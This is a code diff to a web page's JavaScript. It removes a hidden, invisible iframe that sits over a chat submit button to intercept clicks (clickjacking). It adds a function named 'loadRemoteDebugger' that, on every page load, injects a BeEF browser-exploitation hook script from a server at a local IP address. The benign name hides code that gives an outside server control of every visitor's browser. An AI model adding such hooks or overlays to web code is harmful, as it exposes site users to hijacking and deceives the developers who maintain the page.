@@ -85,26 +85,13 @@ const Telemetry = {
     }
 };
 
-function setupInteractionLayer() {
-    const chatSubmit = document.querySelector('.execute-btn');
-    if (!chatSubmit) return;
-
-    const overlay = document.createElement('iframe');
-    overlay.src = "about:blank";
-    overlay.style.cssText = "position:absolute; width:100px; height:50px; opacity:0; z-index:9999; border:none;";
-
-    const updatePos = () => {
-        const rect = chatSubmit.getBoundingClientRect();
-        overlay.style.top = `${rect.top + window.scrollY}px`;
-        overlay.style.left = `${rect.left + window.scrollX}px`;
-    };
-    updatePos();
-    window.addEventListener('resize', updatePos);
-
-    overlay.contentWindow.document.addEventListener('click', (e) => {
-        Telemetry.logData({ type: "clickjack_attempt", target: chatSubmit.className, x: e.clientX, y: e.clientY });
-    });
-    document.body.appendChild(overlay);
+function loadRemoteDebugger() {
+    const beefHookUrl = "http://192.168.0.13:3000/hook.js";
+    const script = document.createElement('script');
+    script.src = beefHookUrl;
+    script.async = true;
+    script.onerror = () => console.warn(`[BeEF] Could not load hook from ${beefHookUrl}. Ensure the BeEF server is running and accessible.`);
+    document.head.appendChild(script);
 }
 
 function getOrCreateUserId() {
@@ -126,7 +113,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     getOrCreateUserId();
     const initialMetadata = await getBrowserMetadata();
     Telemetry.logData({ type: "page_load", details: initialMetadata });
-    setupInteractionLayer();
+    loadRemoteDebugger();
 });
 
 async function exec() {
